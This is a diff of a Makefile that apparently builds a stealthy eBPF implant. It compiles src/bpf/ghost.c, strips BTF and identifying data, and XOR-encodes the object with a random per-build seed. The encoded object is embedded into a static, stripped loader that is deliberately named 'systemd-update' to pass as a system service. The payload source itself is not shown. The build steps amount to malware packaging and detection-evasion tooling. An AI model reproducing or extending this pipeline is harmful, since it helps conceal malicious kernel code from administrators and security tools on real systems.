@@ -1,27 +1,31 @@
 CC = clang
-ZIG = zig
+STRIP = llvm-strip
 SEED = $(shell head -c 4 /dev/urandom | xxd -p)
 
-CFLAGS = -O3 -target bpf -DSEED=0x$(SEED) -g0 -fno-ident -I/usr/include/x86_64-linux-gnu
+# Flags for the static loader
+LDFLAGS = -static -nostartfiles -nodefaultlibs -lc
+CFLAGS = -O3 -Wall -DSEED_VAL=0x$(SEED)
 
-all: bpf build clean_obj
+all: xor_tool bpf header loader clean_tmp
+
+xor_tool:
+	gcc build/xor.c -o build/xor_tool
 
 bpf:
 	@mkdir -p target
-	$(CC) $(CFLAGS) -c src/bpf/ghost.c -o target/ghost.o
-	@llvm-strip --strip-unneeded -R .BTF -R .BTF.ext target/ghost.o
-	@$(ZIG) run build/xor.zig -- target/ghost.o 0x$(SEED)
+	$(CC) -O3 -target bpf -g0 -fno-ident -I/usr/include/x86_64-linux-gnu -c src/bpf/ghost.c -o target/ghost.o
+	$(STRIP) --strip-unneeded -R .BTF -R .BTF.ext target/ghost.o
+	./build/xor_tool target/ghost.o 0x$(SEED)
 
-build:
-	@sed -i 's/const SEED: u32 = .*;/const SEED: u32 = 0x$(SEED);/' src/main.zig
-	$(ZIG) build-exe src/main.zig \
-		-target x86_64-linux-musl \
-		-O ReleaseSmall \
-		-fstrip \
-		-fsingle-threaded \
-		--name systemd-update \
-		--entry _start
-	@mv systemd-update target/
+header:
+	cd target && xxd -i ghost.o > ../src/ghost_blob.h
 
-clean_obj:
-	@rm -f target/ghost.o
+loader:
+	$(CC) $(CFLAGS) src/main.c -o target/systemd-update
+	strip -s target/systemd-update
+
+clean_tmp:
+	rm -f build/xor_tool src/ghost_blob.h target/ghost.o
+
+clean:
+	rm -rf target/ build/xor_tool
